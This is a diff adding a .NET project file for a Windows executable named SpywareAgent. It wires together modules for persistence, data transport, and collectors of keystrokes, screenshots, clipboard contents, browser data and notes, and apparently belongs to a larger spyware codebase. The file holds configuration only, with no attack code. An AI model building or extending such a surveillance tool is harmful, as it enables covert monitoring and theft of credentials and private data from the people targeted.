@@ -1,0 +1,30 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net8.0-windows</TargetFramework>
+    <RootNamespace>Spyware.Agent</RootNamespace>
+    <AssemblyName>SpywareAgent</AssemblyName>
+    <UseWindowsForms>true</UseWindowsForms>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Spyware.Agent.Program</StartupObject>
+  </PropertyGroup>
+
+  <ItemGroup>
+    <ProjectReference Include="..\Spyware.Core\Spyware.Core.csproj" />
+    <ProjectReference Include="..\Spyware.Persistence\Spyware.Persistence.csproj" />
+    <ProjectReference Include="..\Spyware.Storage\Spyware.Storage.csproj" />
+    <ProjectReference Include="..\Spyware.Collectors.Screenshot\Spyware.Collectors.Screenshot.csproj" />
+    <ProjectReference Include="..\Spyware.Collectors.Clipboard\Spyware.Collectors.Clipboard.csproj" />
+    <ProjectReference Include="..\Spyware.Collectors.Browsers\Spyware.Collectors.Browsers.csproj" />
+    <ProjectReference Include="..\Spyware.Collectors.Keyboard\Spyware.Collectors.Keyboard.csproj" />
+    <ProjectReference Include="..\Spyware.Collectors.Notes\Spyware.Collectors.Notes.csproj" />
+    <ProjectReference Include="..\Spyware.Transport\Spyware.Transport.csproj" />
+    <ProjectReference Include="..\Spyware.Maintenance\Spyware.Maintenance.csproj" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <None Update="app.manifest" CopyToOutputDirectory="PreserveNewest" />
+  </ItemGroup>
+
+</Project>
